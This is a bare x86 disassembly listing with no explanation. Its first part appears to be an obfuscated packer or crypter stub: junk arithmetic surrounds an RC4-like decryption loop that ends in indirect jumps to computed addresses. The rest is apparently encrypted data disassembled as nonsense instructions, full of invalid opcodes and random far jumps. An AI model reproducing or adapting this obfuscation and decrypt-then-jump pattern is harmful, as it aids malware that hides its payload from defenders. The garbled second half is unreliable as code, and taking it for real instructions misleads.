  40c137:	mov    ebx,DWORD PTR ds:0x41f7bb
  40c13d:	sub    ebx,edi
  40c13f:	add    ebx,edi
  40c141:	jmp    0x40baa2
  40c146:	inc    esi
  40c147:	and    edx,0xff
  40c14d:	add    DWORD PTR ds:0x41f8a0,ebx
  40c153:	mov    ebx,DWORD PTR ds:0x41f736
  40c159:	mov    edi,edx
  40c15b:	imul   ebx,ecx,0x5b
  40c15e:	mov    dl,BYTE PTR [esp+edi*1+0x18]
  40c162:	add    ebx,DWORD PTR ds:0x41f7f0
  40c168:	sub    esi,ebx
  40c16a:	mov    BYTE PTR [esp+eax*1+0x18],dl
  40c16e:	sub    DWORD PTR ds:0x41f837,esi
  40c174:	mov    ebx,DWORD PTR ds:0x41f74a
  40c17a:	pop    ebx
  40c17b:	dec    esi
  40c17c:	dec    ebp
  40c17d:	sub    ebx,edx
  40c17f:	xor    esi,edx
  40c181:	mov    BYTE PTR [esp+edi*1+0x14],cl
  40c185:	add    DWORD PTR ds:0x41f72c,esi
  40c18b:	mov    bl,0x68
  40c18d:	nop
  40c18e:	jne    0x40bde4
  40c194:	add    esi,DWORD PTR ds:0x41f715
  40c19a:	mov    ebp,DWORD PTR [esp+0x128]
  40c1a1:	inc    ebx
  40c1a2:	inc    ebx
  40c1a3:	sub    DWORD PTR ds:0x41f92d,esi
  40c1a9:	lea    ebx,[ecx+0x74]
  40c1ac:	dec    ebx
  40c1ad:	xor    esi,0xffffffe6
  40c1b0:	xor    ebx,eax
  40c1b2:	mov    DWORD PTR ds:0x41f7dd,ebx
  40c1b8:	mov    esi,edi
  40c1ba:	mov    ebx,DWORD PTR ds:0x41f726
  40c1c0:	inc    ebx
  40c1c1:	add    ebx,ecx
  40c1c3:	sub    ebx,ecx
  40c1c5:	add    DWORD PTR ds:0x41f6f4,ebx
  40c1cb:	lea    ebx,[ecx+edx*1]
  40c1ce:	mov    edi,DWORD PTR [esp+0xc]
  40c1d2:	dec    ebx
  40c1d3:	add    ebx,edx
  40c1d5:	test   ebp,ebp
  40c1d7:	jbe    0x40c2ba
  40c1dd:	sub    ebx,ecx
  40c1df:	sub    DWORD PTR ds:0x41f888,ebx
  40c1e5:	mov    ebx,esi
  40c1e7:	movzx  ebx,cl
  40c1ea:	dec    ebx
  40c1eb:	lea    eax,[eax+0x1]
  40c1ee:	add    ebx,DWORD PTR ds:0x41f833
  40c1f4:	add    DWORD PTR ds:0x41f83b,ebx
  40c1fa:	push   ecx
  40c1fb:	mov    ebx,DWORD PTR ds:0x41f7aa
  40c201:	add    ebx,DWORD PTR ds:0x41f75f
  40c207:	push   ax
  40c209:	dec    ebx
  40c20a:	xor    eax,eax
  40c20c:	sub    ebx,edi
  40c20e:	add    DWORD PTR ds:0x41f74d,ebx
  40c214:	pop    ax
  40c216:	mov    ebx,ebp
  40c218:	xor    ah,ah
  40c21a:	xor    ebx,edx
  40c21c:	sub    ebx,edi
  40c21e:	mov    cl,BYTE PTR [esp+eax*1+0x18]
  40c222:	and    ebx,edi
  40c224:	add    DWORD PTR ds:0x41f757,ebx
  40c22a:	movzx  edx,cl
  40c22d:	mov    ebx,DWORD PTR ds:0x41f70e
  40c233:	add    edx,esi
  40c235:	sub    ebx,ecx
  40c237:	and    edx,0xff
  40c23d:	dec    ebx
  40c23e:	add    ebx,DWORD PTR ds:0x41f8d1
  40c244:	mov    esi,edx
  40c246:	mov    DWORD PTR ds:0x41f8b1,ebx
  40c24c:	movzx  edx,BYTE PTR [esp+esi*1+0x18]
  40c251:	mov    bl,0x21
  40c253:	mov    BYTE PTR [esp+eax*1+0x18],dl
  40c257:	sub    ebx,DWORD PTR ds:0x41f8a7
  40c25d:	sub    ebx,eax
  40c25f:	mov    BYTE PTR [esp+esi*1+0x18],cl
  40c263:	and    ebx,esi
  40c265:	sub    DWORD PTR ds:0x41f8e1,ebx
  40c26b:	movzx  edx,BYTE PTR [esp+eax*1+0x18]
  40c270:	mov    ebx,edi
  40c272:	add    edx,ecx
  40c274:	xor    ebx,edx
  40c276:	sub    ebx,edi
  40c278:	and    edx,0xff
  40c27e:	sub    ebx,eax
  40c280:	mov    DWORD PTR ds:0x41f8e6,ebx
  40c286:	movzx  ecx,BYTE PTR [esp+edx*1+0x18]
  40c28b:	mov    ebx,DWORD PTR ds:0x41f727
  40c291:	xor    BYTE PTR [edi+0x0],cl
  40c294:	inc    ebx
  40c295:	inc    edi
  40c296:	inc    ebx
  40c297:	sub    ebx,edi
  40c299:	pop    ecx
  40c29a:	mov    DWORD PTR ds:0x41f844,ebx
  40c2a0:	mov    ebx,eax
  40c2a2:	add    ebx,DWORD PTR ds:0x41f918
  40c2a8:	sub    ebx,edx
  40c2aa:	movzx  ebx,dl
  40c2ad:	sub    DWORD PTR ds:0x41f894,ebx
  40c2b3:	dec    ebp
  40c2b4:	jne    0x40c1ea
  40c2ba:	mov    ebx,DWORD PTR ds:0x41f898
  40c2c0:	mov    ecx,DWORD PTR [esp+0x114]
  40c2c7:	xor    ebx,ecx
  40c2c9:	add    ebx,DWORD PTR ds:0x41f7bd
  40c2cf:	add    ebx,edi
  40c2d1:	pop    esi
  40c2d2:	sub    DWORD PTR ds:0x41f759,ebx
  40c2d8:	mov    ebx,edi
  40c2da:	pop    ebp
  40c2db:	xor    ebx,0x7
  40c2de:	sub    ebx,edx
  40c2e0:	pop    edi
  40c2e1:	sub    ebx,DWORD PTR ds:0x41f772
  40c2e7:	sub    esp,0xfffffef4
  40c2ed:	inc    eax
  40c2ee:	pop    eax
  40c2ef:	jmp    eax
  40c2f1:	push   ebp
  40c2f2:	push   esp
  40c2f3:	call   DWORD PTR ds:0x40c469
  40c2f9:	pop    ebp
  40c2fa:	pop    eax
  40c2fb:	jmp    eax
  40c2fd:	push   ebp
  40c2fe:	push   0xb0f02e1d
  40c303:	push   0xdd639447
  40c308:	push   0x5735da13
  40c30d:	mov    DWORD PTR ds:0x41f856,ecx
  40c313:	push   0x73e16df7
  40c318:	mov    ecx,DWORD PTR ds:0x41f8f5
  40c31e:	push   esp
  40c31f:	or     ecx,0xffffffba
  40c322:	dec    eax
  40c323:	sub    eax,edx
  40c325:	sub    DWORD PTR ds:0x41f76b,ecx
  40c32b:	lea    eax,[eax+0x60]
  40c32e:	sub    ecx,esi
  40c330:	add    ecx,ebx
  40c332:	sub    eax,esi
  40c334:	mov    esi,0x1da00
  40c339:	sub    DWORD PTR ds:0x41f707,eax
  40c33f:	push   esi
  40c340:	mov    al,0x39
  40c342:	xor    esi,esi
  40c344:	add    ecx,eax
  40c346:	add    eax,esi
  40c348:	push   0x10
  40c34a:	sub    ecx,eax
  40c34c:	mov    ds:0x41f7c3,eax
  40c351:	push   esi
  40c352:	lea    ecx,[edx+0x36]
  40c355:	push   esi
  40c356:	dec    eax
  40c357:	add    eax,ebx
  40c359:	mov    esi,DWORD PTR [esp+0x2c]
  40c35d:	inc    ecx
  40c35e:	add    DWORD PTR ds:0x41f823,eax
  40c364:	mov    DWORD PTR [esp],esi
  40c367:	call   0x40bc20
  40c36c:	mov    eax,ds:0x41f8d3
  40c371:	sub    eax,ebp
  40c373:	inc    ecx
  40c374:	add    ecx,DWORD PTR ds:0x41f787
  40c37a:	add    esp,0x28
  40c37d:	pop    eax
  40c37e:	jmp    eax
  40c380:	push   ebp
  40c381:	add    DWORD PTR ds:0x41f7a7,edx
  40c387:	push   eax
  40c388:	mov    ecx,0xffffffff
  40c38d:	mov    ebx,DWORD PTR ds:0x41f8a2
  40c393:	inc    ecx
  40c394:	je     0x40c45b
  40c39a:	inc    ebx
  40c39b:	dec    ecx
  40c39c:	add    edx,DWORD PTR ds:0x41f819
  40c3a2:	inc    edx
  40c3a3:	mov    edi,eax
  40c3a5:	mov    DWORD PTR ds:0x41f7b7,edx
  40c3ab:	lea    ebx,[edx+0x28]
  40c3ae:	mov    esi,edi
  40c3b0:	imul   edx,ebp,0x3f
  40c3b3:	sub    edx,ebx
  40c3b5:	mov    eax,DWORD PTR [ecx]
  40c3b7:	or     ebx,0xfffffff3
  40c3ba:	add    DWORD PTR ds:0x41f73f,ebx
  40c3c0:	lea    eax,[eax+esi*1]
  40c3c3:	mov    edx,edi
  40c3c5:	cmp    eax,edi
  40c3c7:	jne    0x40c3f0
  40c3cd:	add    ebx,ebp
  40c3cf:	add    esi,0x10
  40c3d2:	add    ebx,eax
  40c3d4:	sub    ebx,edi
  40c3d6:	add    ecx,0x4
  40c3d9:	mov    DWORD PTR ds:0x41f8ae,edx
  40c3df:	mov    dh,0x74
  40c3e1:	mov    eax,DWORD PTR [ecx]
  40c3e3:	movsx  ebx,cl
  40c3e6:	dec    edx
  40c3e7:	lea    eax,[eax+esi*1]
  40c3ea:	inc    edx
  40c3eb:	jmp    0x40c3c3
  40c3f0:	add    DWORD PTR ds:0x41f7ce,edx
  40c3f6:	push   ecx
  40c3f7:	mov    ebx,DWORD PTR ds:0x41f7a5
  40c3fd:	mov    ecx,DWORD PTR [ecx]
  40c3ff:	add    edx,edi
  40c401:	test   ecx,ecx
  40c403:	je     0x40c430
  40c409:	xor    ebx,edx
  40c40b:	inc    ebx
  40c40c:	sub    DWORD PTR ds:0x41f7c2,edx
  40c412:	lea    edx,[edx+edx*1]
  40c415:	movsx  ebx,cx
  40c418:	dec    ebx
  40c419:	add    edx,DWORD PTR ds:0x41f71e
  40c41f:	mov    DWORD PTR ds:0x41f859,edx
  40c425:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c427:	mov    ebx,esi
  40c429:	pop    ecx
  40c42a:	inc    ebx
  40c42b:	jmp    0x40c3cd
  40c430:	add    ebx,edi
  40c432:	pop    ecx
  40c433:	and    edx,eax
  40c435:	mov    DWORD PTR ds:0x41f88b,edx
  40c43b:	mov    dl,0x26
  40c43d:	sub    esi,edi
  40c43f:	add    ebx,edx
  40c441:	add    edx,ebp
  40c443:	mov    BYTE PTR [edi],0x0
  40c446:	dec    ebx
  40c447:	add    DWORD PTR ds:0x41f8e9,edx
  40c44d:	inc    edi
  40c44e:	mov    ebx,DWORD PTR ds:0x41f848
  40c454:	dec    esi
  40c455:	jne    0x40c441
  40c45b:	and    ebx,edi
  40c45d:	pop    eax
  40c45e:	dec    ebx
  40c45f:	pop    ebp
  40c460:	ret    
  40c461:	into   
  40c462:	add    BYTE PTR [eax+eax*1],0xe1
  40c466:	add    BYTE PTR [eax+eax*1],0xf0
  40c46a:	add    BYTE PTR [eax+eax*1],0xff
  40c46e:	add    BYTE PTR [eax+eax*1],0xa
  40c472:	add    DWORD PTR [eax+eax*1],0x4811b
  40c479:	sub    BYTE PTR [ecx+0x4],al
  40c47f:	add    BYTE PTR [eax],al
  40c481:	cmp    al,BYTE PTR [ecx-0x7eb5fffc]
  40c487:	add    al,0x0
  40c489:	add    BYTE PTR [eax],al
  40c48b:	add    BYTE PTR [eax],al
  40c48d:	pop    ebp
  40c48e:	add    DWORD PTR [eax+eax*1],0x0
  40c495:	jo     0x40c418
  40c497:	add    al,0x0
  40c499:	add    BYTE PTR [eax],al
  40c49b:	add    BYTE PTR [eax],al
  40c49d:	push   ss
  40c49e:	jnp    0x40c485
  40c4a0:	aad    0x38
  40c4a2:	mov    dl,0x72
  40c4a4:	xor    DWORD PTR [edi*2+0x50d22583],edi
  40c4ab:	or     BYTE PTR [esi],bl
  40c4ad:	jmp    0x6fed:0xee1e25e6
  40c4b4:	sbb    DWORD PTR [ecx-0x24],eax
  40c4b7:	ret    
  40c4b8:	xlat   BYTE PTR ds:[ebx]
  40c4b9:	test   al,0x55
  40c4bb:	cmp    ch,dh
  40c4bd:	mov    BYTE PTR [ebx-0x6d],dl
  40c4c0:	std    
  40c4c1:	jae    0x40c4b5
  40c4c3:	fcmovbe st,st(5)
  40c4c5:	out    0xd4,al
  40c4c7:	pop    esi
  40c4c8:	add    al,0xca
  40c4ca:	inc    ecx
  40c4cb:	xor    dh,BYTE PTR [esi+ebx*4+0x252bc52d]
  40c4d2:	mov    BYTE PTR [edi-0x47],dh
  40c4d5:	add    esi,DWORD PTR [esi+ecx*1-0x26]
  40c4d9:	and    eax,0x28ac8d01
  40c4de:	sbb    cl,BYTE PTR [ecx+0x43cb346]
  40c4e4:	adc    al,0xd1
  40c4e6:	adc    DWORD PTR [ebx+0x30769656],ebp
  40c4ec:	sub    eax,0x2a1d2678
  40c4f1:	xor    eax,0xd97be475
  40c4f6:	adc    al,0x5e
  40c4f8:	mov    DWORD PTR [eax+0x39],ebp
  40c4fb:	pop    ebx
  40c4fc:	shr    DWORD PTR [esi+0x13],cl
  40c4ff:	pop    edx
  40c500:	push   esp
  40c501:	inc    ebx
  40c502:	push   0x696ab8bc
  40c507:	test   eax,0xf53780fa
  40c50c:	cmc    
  40c50d:	dec    esi
  40c50e:	lods   al,BYTE PTR ds:[esi]
  40c50f:	sbb    eax,0xa1ba6eff
  40c514:	xchg   esp,eax
  40c515:	pop    edi
  40c516:	push   0x22
  40c518:	es and eax,0x588e95fd
  40c51e:	inc    edi
  40c51f:	jo     0x40c510
  40c521:	sub    eax,0x8762e490
  40c526:	lahf   
  40c527:	lods   al,BYTE PTR ds:[esi]
  40c528:	and    eax,0xee358b0b
  40c52d:	es jmp 0x6402e96a
  40c533:	or     bl,BYTE PTR ds:0x6cbe1af3
  40c539:	fs aas 
  40c53b:	sti    
  40c53c:	ds clc 
  40c53e:	pop    ss
  40c53f:	push   ecx
  40c540:	movd   mm4,edi
  40c543:	dec    esp
  40c544:	mov    bl,0x95
  40c546:	sub    dh,BYTE PTR [edi+0x14dad9ab]
  40c54c:	jne    0x40c580
  40c54e:	test   al,0xa
  40c550:	leave  
  40c551:	ja     0x40c519
  40c553:	ja     0x40c551
  40c555:	jmp    0xeff2723f
  40c55a:	sar    BYTE PTR [eax],cl
  40c55c:	and    BYTE PTR [edx+ebx*4+0x1fa674a3],0x3a
  40c564:	add    edx,DWORD PTR [esi+0x222fbdd]
  40c56a:	xor    edi,DWORD PTR [ebx]
  40c56c:	sar    DWORD PTR [esi+edx*8],0xf1
  40c570:	mov    BYTE PTR [edx],dh
  40c572:	aam    0xac
  40c574:	aas    
  40c575:	iret   
  40c576:	test   ax,0xb9a8
  40c57a:	jg     0x40c5b8
  40c57c:	jnp    0x40c541
  40c57e:	loope  0x40c5db
  40c580:	pop    esp
  40c581:	xchg   ebx,eax
  40c582:	xlat   BYTE PTR ds:[ebx]
  40c583:	mov    ?,WORD PTR [edi]
  40c585:	adc    bl,BYTE PTR [edx+0x36c42adb]
  40c58b:	add    al,0x5b
  40c58d:	aaa    
  40c58e:	iret   
  40c58f:	mov    edi,DWORD PTR [edx-0x1d53d95c]
  40c595:	aas    
  40c596:	ins    BYTE PTR es:[edi],dx
  40c597:	bound  ebp,QWORD PTR [esi-0x2d5eeb3c]
  40c59d:	or     DWORD PTR [esi+0x14537a91],edi
  40c5a3:	add    DWORD PTR [edi],eax
  40c5a5:	pop    edx
  40c5a6:	push   0xb82ef042
  40c5ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5ac:	jb     0x40c5cf
  40c5ae:	stos   BYTE PTR es:[edi],al
  40c5af:	xor    DWORD PTR [ebp+0x15cf159c],0xffffffc6
  40c5b6:	loopne 0x40c556
  40c5b8:	adc    ah,BYTE PTR [ecx-0x76203257]
  40c5be:	mov    cl,0xec
  40c5c0:	out    dx,al
  40c5c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5c2:	lods   al,BYTE PTR ds:[esi]
  40c5c3:	lea    ebp,[esi-0x4cbf638]
  40c5c9:	xor    ah,BYTE PTR [ebx]
  40c5cb:	gs gs scas eax,DWORD PTR es:[edi]
  40c5ce:	or     dl,BYTE PTR [edx+0x4611d34b]
  40c5d4:	cdq    
  40c5d5:	adc    BYTE PTR [eax-0x5889194b],bl
  40c5db:	into   
  40c5dc:	sbb    eax,0x9ace02f2
  40c5e1:	aas    
  40c5e2:	aam    0x80
  40c5e4:	(bad)  [edi-0x50]
  40c5e7:	in     eax,dx
  40c5e8:	dec    esp
  40c5e9:	xchg   edi,eax
  40c5ea:	ret    0xccb7
  40c5ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5ee:	sbb    DWORD PTR [ebx+0x15],edx
  40c5f1:	push   esp
  40c5f2:	imul   ebx,DWORD PTR [ecx+ecx*1-0x72],0xa3dc51f4
  40c5fa:	rcr    ecx,1
  40c5fc:	dec    ebx
  40c5fd:	cmp    ecx,DWORD PTR [edi+0x52f34336]
  40c603:	sar    DWORD PTR [ebp+0x40fbeace],1
  40c609:	pop    esp
  40c60a:	lock nop
  40c60c:	mov    ds:0xa874c4c9,al
  40c611:	dec    esp
  40c612:	repz bound eax,QWORD PTR [edx]
  40c615:	add    esi,edx
  40c617:	(bad)  
  40c618:	mov    esi,0x11cf8acf
  40c61d:	mov    gs,WORD PTR [edx-0x181fd396]
  40c623:	jmp    0x40c5e8
  40c625:	ret    
  40c626:	inc    edi
  40c627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c628:	push   edi
  40c629:	inc    eax
  40c62a:	(bad)  [ebx-0x195f4ee]
  40c630:	jmp    0x40c636
  40c632:	adc    eax,0x15ed3ecd
  40c637:	add    DWORD PTR [ebp+0x54fc51a],esp
  40c63d:	mov    dl,0x74
  40c63f:	clc    
  40c640:	add    ah,BYTE PTR [ebx+0x3b]
  40c643:	ret    
  40c644:	int3   
  40c645:	shl    BYTE PTR [esi],0x94
  40c648:	add    DWORD PTR [ebx+esi*8+0x11c88af1],esi
  40c64f:	imul   ebx,DWORD PTR [esi+0xcc14526],0xffffffe2
  40c656:	adc    bl,BYTE PTR [eax+0x10]
  40c659:	cld    
  40c65a:	xchg   edi,eax
  40c65b:	mov    cl,0x29
  40c65d:	xchg   esi,eax
  40c65e:	xchg   ecx,eax
  40c65f:	ds mov bl,0x1c
  40c662:	xchg   BYTE PTR [ebx],ah
  40c664:	pushf  
  40c665:	bsr    ecx,DWORD PTR [edi+0x624456dd]
  40c66c:	imul   ebp,DWORD PTR [edx],0x63
  40c66f:	or     eax,0x1ace9a8c
  40c674:	ret    
  40c675:	or     DWORD PTR [esi],0x431405d1
  40c67b:	or     al,0xf
  40c67d:	into   
  40c67e:	arpl   WORD PTR [edi],si
  40c680:	call   0x8956:0x8e61394b
  40c687:	xor    eax,0xcda13ba7
  40c68c:	fnstenv [eax]
  40c68e:	pop    ecx
  40c68f:	arpl   WORD PTR ds:0x9f2af29a,di
  40c695:	xor    ah,BYTE PTR [ecx]
  40c697:	mov    ebx,?
  40c699:	xchg   ebp,eax
  40c69a:	ds loopne 0x40c6f9
  40c69d:	and    edi,DWORD PTR ds:0xc4cfdc61
  40c6a3:	sahf   
  40c6a4:	int3   
  40c6a5:	or     eax,0x43c00514
  40c6aa:	xchg   cl,bl
  40c6ac:	or     BYTE PTR [ebx+0x64],al
  40c6af:	fidivr DWORD PTR [ebx]
  40c6b1:	aaa    
  40c6b2:	out    dx,eax
  40c6b3:	ret    
  40c6b4:	push   esp
  40c6b5:	jmp    0xb6c5:0xc49c1e7f
  40c6bc:	retf   
  40c6bd:	pop    ecx
  40c6be:	(bad)  
  40c6bf:	leave  
  40c6c0:	push   ss
  40c6c1:	mov    bh,0x0
  40c6c3:	cmp    BYTE PTR [edi],bl
  40c6c5:	sahf   
  40c6c6:	jp     0x40c6d8
  40c6c8:	gs jno 0x40c6ac
  40c6cb:	inc    edx
  40c6cc:	out    dx,eax
  40c6cd:	les    ebx,FWORD PTR [ebx+0xf]
  40c6d0:	push   edi
  40c6d1:	sbb    ebx,eax
  40c6d3:	adc    al,BYTE PTR cs:[ebp-0x55e5d50f]
  40c6da:	or     edx,DWORD PTR [ecx+0x7de9ec32]
  40c6e0:	sbb    al,0x5f
  40c6e2:	mov    ?,WORD PTR ds:0x29dd8f74
  40c6e8:	ja     0x40c75a
  40c6ea:	adc    al,0x48
  40c6ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6ed:	ret    
  40c6ee:	ror    BYTE PTR [edi-0x1ae7ebd4],0x3e
  40c6f5:	jno    0x40c6e6
  40c6f7:	or     ecx,ebp
  40c6f9:	pop    es
  40c6fa:	fmul   DWORD PTR [eax+0x63]
  40c6fd:	push   cs
  40c6fe:	xchg   esp,eax
  40c6ff:	pop    es
  40c700:	mov    ch,0xb
  40c702:	sbb    DWORD PTR [edi+ebx*1],edx
  40c705:	data16 or al,0xde
  40c708:	cmp    edx,DWORD PTR [ecx+0x5a554cac]
  40c70e:	add    al,0x84
  40c710:	add    DWORD PTR [edi+0x1c],0xa10dce79
  40c717:	shl    DWORD PTR [ebx-0x49],cl
  40c71a:	jecxz  0x40c718
  40c71c:	bound  ecx,QWORD PTR [ebp-0x37]
  40c71f:	lock xchg edx,eax
  40c721:	or     DWORD PTR [edi],0x6a
  40c724:	cld    
  40c725:	pop    es
  40c726:	out    dx,eax
  40c727:	jbe    0x40c6e5
  40c729:	xor    eax,DWORD PTR [ebx+0x3a06b60a]
  40c72f:	int    0x6d
  40c731:	inc    esi
  40c732:	push   0x96d74dbb
  40c737:	aad    0x14
  40c739:	dec    ebp
  40c73a:	cmp    al,dh
  40c73c:	xchg   ebp,eax
  40c73d:	and    DWORD PTR [ecx+0x57feba16],ebp
  40c743:	shl    BYTE PTR [ebp+0x4daa65a],cl
  40c749:	sub    eax,0x97073ba0
  40c74e:	in     al,dx
  40c74f:	sub    bh,al
  40c751:	and    BYTE PTR ds:0x2fa27d74,bh
  40c757:	cmc    
  40c758:	or     dl,al
  40c75a:	jmp    DWORD PTR [ebx-0x285f70ca]
  40c760:	mov    ds:0xa1422696,al
  40c765:	int    0x3f
  40c767:	mov    ?,WORD PTR [edx+0x15]
  40c76a:	(bad)  
  40c76b:	jne    0x40c74d
  40c76d:	xchg   ebx,eax
  40c76e:	adc    esp,edi
  40c770:	sbb    DWORD PTR [edi-0x7e],0xffffffad
  40c774:	loop   0x40c7bf
  40c776:	pop    ds
  40c777:	pop    ds
  40c778:	sbb    eax,0x3a6e2e7a
  40c77d:	mov    dh,0x51
  40c77f:	xchg   edx,eax
  40c780:	scas   eax,DWORD PTR es:[edi]
  40c781:	test   eax,0x32feb445
  40c786:	aad    0x1f
  40c788:	adc    cl,BYTE PTR [ecx]
  40c78a:	add    cl,ah
  40c78c:	pop    esi
  40c78d:	mov    ebp,0x693791cd
  40c792:	jge    0x40c73f
  40c794:	std    
  40c795:	outs   dx,BYTE PTR gs:[esi]
  40c797:	stc    
  40c798:	add    DWORD PTR [eax+0x7],esp
  40c79b:	mov    edi,0xbfef3ed3
  40c7a0:	sbb    DWORD PTR [ebp-0x5480afa8],esp
  40c7a6:	in     al,dx
  40c7a7:	adc    esp,DWORD PTR [edi-0x14]
  40c7aa:	mov    ch,0xfa
  40c7ac:	pop    ecx
  40c7ad:	inc    edi
  40c7ae:	pop    ss
  40c7af:	jmp    0x34038057
  40c7b4:	and    al,0x56
  40c7b6:	mov    eax,0x56a23ab0
  40c7bb:	or     dl,BYTE PTR [ebx+0x6d]
  40c7be:	jmp    0x40c80f
  40c7c0:	pop    edi
  40c7c1:	push   0x3e
  40c7c3:	ret    0xb6f
  40c7c6:	jg     0x40c834
  40c7c8:	mov    esi,0xf15eb38c
  40c7cd:	xchg   DWORD PTR [ecx],ecx
  40c7cf:	ins    BYTE PTR es:[edi],dx
  40c7d0:	jecxz  0x40c7bc
  40c7d2:	inc    ebp
  40c7d3:	ret    
  40c7d4:	add    al,0x7f
  40c7d6:	sbb    bl,BYTE PTR [edx-0x22]
  40c7d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7db:	adc    BYTE PTR [eax-0x64],bh
  40c7de:	mov    ds:0xd2df7b5f,eax
  40c7e3:	xchg   ebx,eax
  40c7e4:	js     0x40c7f3
  40c7e6:	mov    fs,ebx
  40c7e8:	ret    
  40c7e9:	ror    BYTE PTR [edi-0x69],0x59
  40c7ed:	imul   esp,eax,0xc
  40c7f0:	sub    BYTE PTR [ebp-0x54],bl
  40c7f3:	retf   
  40c7f4:	push   esi
  40c7f5:	adc    al,0x99
  40c7f7:	out    0x90,eax
  40c7f9:	push   ds
  40c7fa:	xor    dl,bh
  40c7fc:	inc    ebp
  40c7fd:	jmp    0x40c7e7
  40c7ff:	sbb    eax,0x3fe3019
  40c804:	sub    BYTE PTR [esi],0x27
  40c807:	inc    ebx
  40c808:	xlat   BYTE PTR ds:[ebx]
  40c809:	pushf  
  40c80a:	sbb    eax,0xc8aa0053
  40c80f:	cwde   
  40c810:	mov    ecx,ss
  40c812:	int3   
  40c813:	fild   QWORD PTR [ecx-0x4e]
  40c816:	lds    edi,FWORD PTR [ecx+edx*4-0x2b]
  40c81a:	fcmovne st,st(6)
  40c81c:	mov    eax,0xb81bc4de
  40c821:	ret    
  40c822:	idiv   DWORD PTR [edi-0x67b4fc31]
  40c828:	mov    ecx,0x8ac4ec78
  40c82d:	pop    ds
  40c82e:	inc    eax
  40c82f:	test   BYTE PTR [eax],bh
  40c831:	dec    eax
  40c832:	sub    edx,esi
  40c834:	jp     0x40c896
  40c836:	ficom  WORD PTR [eax-0xa]
  40c839:	push   0xffffff93
  40c83b:	push   ebp
  40c83c:	mov    BYTE PTR ds:0x18eabdd7,ah
  40c842:	fadd   DWORD PTR [eax+ebx*4+0x69b0ad48]
  40c849:	dec    esp
  40c84a:	or     BYTE PTR [esi-0xe7f4b4c],dh
  40c850:	scas   eax,DWORD PTR es:[edi]
  40c851:	int    0x44
  40c853:	jp     0x40c811
  40c855:	inc    edx
  40c856:	lds    ebp,FWORD PTR [edx+0x97f75f8]
  40c85c:	cmp    DWORD PTR [esi+0x6a],edx
  40c85f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c861:	mov    bl,bh
  40c863:	adc    cl,BYTE PTR [esi-0x5c]
  40c866:	jle    0x40c842
  40c868:	data16 clc 
  40c86a:	sbb    DWORD PTR [eax+0x34f7941f],0xffffff9a
  40c871:	cld    
  40c872:	xor    bh,BYTE PTR [ecx]
  40c874:	push   ecx
  40c875:	gs jg  0x40c8c0
  40c878:	mov    al,0xfc
  40c87a:	mov    al,ds:0x845abc89
  40c87f:	lods   al,BYTE PTR ds:[esi]
  40c880:	pusha  
  40c881:	mov    ebp,0x36170619
  40c886:	add    BYTE PTR [ecx],al
  40c888:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c88a:	jp     0x40c896
  40c88c:	stc    
  40c88d:	(bad)  
  40c88e:	rcl    BYTE PTR [ecx],1
  40c890:	jns    0x40c90d
  40c892:	add    al,0xf0
  40c894:	(bad)  
  40c896:	jnp    0x40c8a4
  40c898:	or     ebx,DWORD PTR [esi-0x6d]
  40c89b:	or     al,0xf0
  40c89d:	out    0xe9,al
  40c89f:	pop    eax
  40c8a0:	dec    edx
  40c8a1:	jmp    0x40c84e
  40c8a3:	mov    ecx,0xfd5f814c
  40c8a8:	loop   0x40c8fe
  40c8aa:	add    al,0xa8
  40c8ac:	sar    DWORD PTR [ebp-0x4908074a],cl
  40c8b2:	clts   
  40c8b4:	stos   DWORD PTR es:[edi],eax
  40c8b5:	mov    esi,0x18546ae0
  40c8ba:	mov    WORD PTR [esi-0x15],gs
  40c8bd:	cli    
  40c8be:	outs   dx,BYTE PTR ds:[esi]
  40c8bf:	fdiv   QWORD PTR [ecx+0x1e53458c]
  40c8c5:	sbb    al,0x52
  40c8c7:	cmp    cl,BYTE PTR [edx-0x76725c62]
  40c8cd:	add    al,0xe
  40c8cf:	or     esi,DWORD PTR [ebp+0x531e87e7]
  40c8d5:	and    esi,DWORD PTR [esi+0x40aa682d]
  40c8db:	ret    0x3d55
  40c8de:	and    al,0x4b
  40c8e0:	jne    0x40c919
  40c8e2:	jecxz  0x40c961
  40c8e4:	psubq  mm1,QWORD PTR [ebx]
  40c8e7:	das    
  40c8e8:	push   ebx
  40c8e9:	ss push ebp
  40c8eb:	(bad)  
  40c8ec:	hlt    
  40c8ed:	fs dec eax
  40c8ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8f0:	mov    edx,0x980fbe04
  40c8f5:	pop    esi
  40c8f6:	push   0x4b
  40c8f8:	inc    edi
  40c8f9:	in     al,0x26
  40c8fb:	gs fsubr st(5),st
  40c8fe:	lods   eax,DWORD PTR ds:[esi]
  40c8ff:	shl    DWORD PTR [ebp-0x25579bd6],0xff
  40c906:	push   esp
  40c907:	pop    esi
  40c908:	clc    
  40c909:	iret   
  40c90a:	cmc    
  40c90b:	inc    eax
  40c90c:	inc    eax
  40c90d:	lods   al,BYTE PTR ds:[esi]
  40c90e:	push   esi
  40c90f:	dec    ebp
  40c910:	sbb    BYTE PTR [esi],ah
  40c912:	mov    ebp,0x324d2cd6
  40c917:	rcl    DWORD PTR [ecx-0x8],cl
  40c91a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c91b:	stc    
  40c91c:	outs   dx,DWORD PTR ds:[esi]
  40c91d:	push   esp
  40c91e:	sar    BYTE PTR [ebx+eax*4],1
  40c921:	cdq    
  40c922:	mov    al,ds:0x6b28fb11
  40c927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c928:	shr    BYTE PTR [esi+0x2a],cl
  40c92b:	dec    ecx
  40c92c:	rol    DWORD PTR [ebp-0x37b71a5f],cl
  40c932:	push   0xffffffc2
  40c934:	jmp    0x790b:0xb2bdf6bb
  40c93b:	fisub  DWORD PTR [esi]
  40c93d:	retf   
  40c93e:	adc    eax,0x9d31283b
